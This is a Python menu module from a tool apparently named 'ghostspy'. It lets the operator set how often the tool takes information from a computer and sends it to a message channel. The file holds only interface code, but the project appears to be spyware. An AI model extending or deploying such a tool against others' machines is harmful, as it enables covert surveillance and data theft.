import main_menu
from common import cmenu
from configuration import configpar as cp


menu_string = """\033[92m[frequency_menu]\033[0m
here, you can configure how often you want ghostspy 
to take information from your computer, keep in mind 
that a fairly short period could generate spam to 
your method of receiving messages.


{}


    [m] new frecuency minutes
    [q] back to main menu                  
"""






def show():
    freq_menu = cmenu.FreqMenu(menu_string)
    freq_menu.load_frequency_menu(config=cp)
    freq_menu.clean_terminal()
    freq_menu.show_menu()

    freq = freq_menu.read_input()
    while freq != 'q':
        new_freq = freq_menu.switch(freq)
        freq_menu.clean_terminal()
        freq_menu.update_frequency(new_freq, config=cp)
        freq_menu.load_frequency_menu(config=cp)
        freq_menu.show_menu()
        freq = freq_menu.read_input()

    main_menu.show()